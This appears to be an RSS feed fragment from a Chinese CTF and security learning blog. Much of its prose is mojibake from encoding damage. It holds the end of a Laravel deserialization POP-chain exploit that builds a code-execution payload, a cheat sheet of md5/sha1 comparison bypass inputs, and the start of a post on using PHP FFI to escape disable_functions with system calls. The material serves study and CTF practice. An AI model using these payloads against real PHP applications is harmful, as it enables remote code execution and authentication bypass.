&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰§è¡Œæ•ˆæœï¼ˆç›–äº†ä¸€å±‚laravelæŠ¥é”™çš„åº•è‰²å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
&lt;p>è¿™ä¸ªé“¾å­éå¸¸çš„é•¿ï¼Œæ¶‰åŠåˆ°6ä¸ªç±»&lt;/p>
&lt;hr>
&lt;p>popé“¾æ€æˆ‘ï¼ï¼ï¼çœ‹ä»£ç æœ‰ç§ç›®å®³çš„æ„Ÿè§‰äº†&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1">Laravel POPé“¾ç®€æ &lt;/a>
&lt;a href="https://xz.aliyun.com/t/5911">Laravel5.8.xååºåˆ—åŒ–POPé“¾&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>md5æ¯”è¾ƒå¸¸è§ç»•è¿‡å°ç»“</title><link>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</link><pubDate>Fri, 03 Dec 2021 00:24:56 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</guid><description>&lt;blockquote>
&lt;p>&lt;strong>&lt;u>å†™åœ¨å¼€å¤´ï¼š&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>åˆ«çº ç»“&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>å·¦ä¾§çš„ç¬¦å·åè½¬&amp;amp;æ ‡é¢˜æ˜¯ä¸­æ–‡å¼•å·&amp;amp;æœ‰äº›ç¬¦å·æ¶ˆå¤±&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>çš„é—®é¢˜&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>æˆ‘ä¹Ÿå¾ˆæ— è¯­&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>å¯„ã€‚&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;ul>
&lt;li>
&lt;pre tabindex="0">&lt;code>md5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>sha1ç»•è¿‡å’Œmd5ç»•è¿‡æ–¹å¼æ˜¯ä¸€æ ·çš„&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="md5amd5b--ab">md5($a)==md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>0eç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>IHKFRNS -&amp;gt; 0e256160682445802696926137988570
QLTHNDT -&amp;gt; 0e405967825401955372549139051580
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
3908336290 -&amp;gt; 0e807624498959190415881248245271
4011627063 -&amp;gt; 0e485805687034439905938362701775
4775635065 -&amp;gt; 0e998212089946640967599450361168
0e215962017 -&amp;gt; 0e291242476940776845150308577824
aabg7XSs -&amp;gt; 0e087386482136013740957780965295
aabC9RqS -&amp;gt; 0e041022518165728065344349536299
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
240610708 -&amp;gt; 0e462097431906509019562988736854
&lt;/code>&lt;/pre>&lt;p>md5ç¢°æ’&lt;/p>
&lt;pre tabindex="0">&lt;code>a=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab">md5($a)==md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>a=&amp;amp;b[]=1
&lt;/code>&lt;/pre>&lt;h2 id="md5string_getamd5md5string_getb--ab">md5((string)$_GET[&amp;lsquo;a&amp;rsquo;])==md5(md5((string)$_GET[&amp;lsquo;b&amp;rsquo;])) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>0eç»•è¿‡ï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸0eï¼Œä¸€ä¸ªæ˜¯ç¬¬äºŒæ¬¡md5åè¿˜ä¸º0eçš„å¥‡è‘©å€¼&lt;/p>
&lt;pre tabindex="0">&lt;code>aawBzC
aabsbm9
aaaabGG5T
aaaabKGVH
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ctype_alphaa--is_numericb">md5($a)==md5($b) &amp;amp;&amp;amp; !ctype_alpha($a) &amp;amp;&amp;amp; !is_numeric($b)&lt;/h2>
&lt;p>0eç»•è¿‡ï¼Œä¸€ä¸ªçº¯æ•°å­—ä¸€ä¸ªçº¯å­—æ¯&lt;/p>
&lt;pre tabindex="0">&lt;code>240610708 -&amp;gt; 0e462097431906509019562988736854
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab">md5($a)===md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab-1">md5($a)===md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab-1">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="ahashmd4a">$a!=hash(&amp;ldquo;md4&amp;rdquo;,$a)&lt;/h2>
&lt;p>0eçº¯æ•°å­—ç»•è¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;0e&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$md4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">hash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/^0e[0-9]*$/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4åŠ å¯†å‰:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4åŠ å¯†åï¼š&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ab--strlena3--strlenb3">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b &amp;amp;&amp;amp; strlen($a)&amp;lt;=3 &amp;amp;&amp;amp; strlen($b)&amp;lt;=3&lt;/h2>
&lt;p>INFè¡¨ç¤ºæ— ç©·å¤§ï¼Œè€ŒNANè¡¨ç¤ºä¸€ä¸ªåœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­æœªå®šä¹‰æˆ–ä¸å¯è¡¨è¿°çš„å€¼ï¼›é™¤äº†ä¸Trueä¹‹å¤–ï¼Œæ‹¿NANä¸å…¶ä»–ä»»ä½•å€¼è¿›è¡Œæ¾æ•£æ¯”è¾ƒæˆ–è€…ä¸¥æ ¼æ¯”è¾ƒè¿”å›ç»“æœéƒ½æ˜¯FALSE
å› ä¸ºä»–ä»¬éƒ½æ˜¯ä¸ç¡®å®šçš„å€¼ï¼Œæ‰€ä»¥åœ¨ä¸è‡ªèº«åšæ¯”è¾ƒæ—¶ï¼Œä¼šè¿”å›false&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030175015724.png" alt="image-20211030175015724">&lt;/p>
&lt;p>INFå’ŒNANç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>a=INF&amp;amp;b=INF
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>a=NAN&amp;amp;b=NAN
&lt;/code>&lt;/pre>&lt;h2 id="this-syc--this-lover--md5this-syc--md5this-lover--sha1this-syc-sha1this-lover">($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover))&lt;/h2>
&lt;p>åšé¢˜é‡åˆ°çš„&lt;/p>
&lt;p>ç”¨åŸç”Ÿç±»&lt;code>Error&lt;/code>ï¼ˆphp7ï¼‰æˆ–&lt;code>Exception&lt;/code>ï¼ˆphp5 or 7ï¼‰ï¼Œå®ƒæœ‰&lt;code>__toString&lt;/code>æ–¹æ³•ï¼Œè¢«è§¦å‘åä¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºå½“å‰ä¿å­˜æƒ…å†µï¼ŒåŒ…æ‹¬é”™è¯¯ä¿¡æ¯å’Œå½“å‰æŠ¥é”™çš„è¡Œå·ï¼Œè€Œè·Ÿä¼ å…¥çš„å‚æ•°æ²¡æœ‰å…³ç³»ï¼›æ‰€ä»¥è¯´å¯ä»¥æ„é€ ä¸¤ä¸ªç±»çš„å®ä¾‹ï¼Œå®ƒä»¬è¡Œå·ç›¸åŒï¼ˆè¢«&lt;code>__toString&lt;/code>è°ƒç”¨åè¾“å‡ºä¿¡æ¯ä¸€æ ·ï¼‰ï¼Œä½†æ˜¯æœ¬èº«ä¸ç›¸åŒï¼ˆä¼ å…¥å‚æ•°ä¸ç­‰ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// è¿™ä¸ªä¸é‡è¦ æ˜¯é‚£ä¸ªé¢˜çš„payload
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„$aå’Œ$bå†™åˆ°ä¸€è¡Œ&lt;/p>
&lt;h2 id="this-token--this-token_flag">$this-&amp;gt;token === $this-&amp;gt;token_flag&lt;/h2>
&lt;p>æŒ‡é’ˆå–åœ°å€ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>$F-&amp;gt;token=&amp;amp;$F-&amp;gt;token_flag;
&lt;/code>&lt;/pre></description></item><item><title>FFIç»•è¿‡disable_functions</title><link>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</link><pubDate>Fri, 03 Dec 2021 00:01:07 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</guid><description>&lt;p>åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥è¿›å…¥æ­£é¢˜ï¼›æ–‡ä¸­å‚è€ƒé“¾æ¥ç»Ÿä¸€æ‰”åé¢äº†&lt;/p>
&lt;h2 id="preloading">Preloading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>é¢„åŠ è½½æ–‡ä»¶åˆ°opcacheä¸­ï¼Œç±»ä¸èƒ½æœ‰ä¸å¯è¾¾çš„çˆ¶ç±»ã€æ¥å£ï¼Œalso only top-level entities are not nested with control structures (e.g. if()&amp;hellip;)may be preloadedï¼›è¢«åŠ è½½åé™¤éé‡å¯ï¼Œè¿›è¡Œçš„ä¿®æ”¹ä¸å½±å“å½“å‰è¿›ç¨‹ï¼›é¢„åŠ è½½ä¸å½±å“é™æ€ç±»æˆå‘˜å’Œå˜é‡çš„è¡¨ç°ï¼›Windowsä¸­ä¸èƒ½é¢„åŠ è½½ä»å†…éƒ¨ç»§æ‰¿çš„ç±»ï¼ˆWindows ASLR and absence of fork() don&amp;rsquo;t allow to guarantee the same addresses of internal classes in different processes.ï¼‰ï¼›å¤šç‰ˆæœ¬æœ‰å¯èƒ½é€ æˆbug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png" alt="image-20211202161008294">&lt;/p>
&lt;h2 id="ffi">FFI&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>æ–‡æ¡£ä¸­ç»™äº†ä¸€ä¸ªå°æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">// create FFI object, loading libc and exporting function printf()
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;int printf(const char *format, ...);&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// this is regular C declaration
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// call C printf()
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello %s!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æ¥è¿è¡Œå³å¯è¾“å‡ºHello world!ï¼›è¿™ä¸ªå‡½æ•°çš„åŸå‹æ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$cdef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">]])&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹¦å†™çš„å½¢å¼ç›¸å½“çš„ç®€æ´ï¼Œåˆ›å»ºFFIå¯¹è±¡ï¼ˆå£°æ˜ï¼‰-&amp;gt;è°ƒç”¨cæ–¹æ³•ï¼›è¯•ç€ç›´æ¥æ‰§è¡Œä¸€ä¸ªwhoami&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#d88200">&amp;#39;$ffi = FFI::cdef(&amp;#34;int system(char *command);&amp;#34;);$ffi-&amp;gt;system(&amp;#34;whoami&amp;#34;);&amp;#39;&lt;/span>
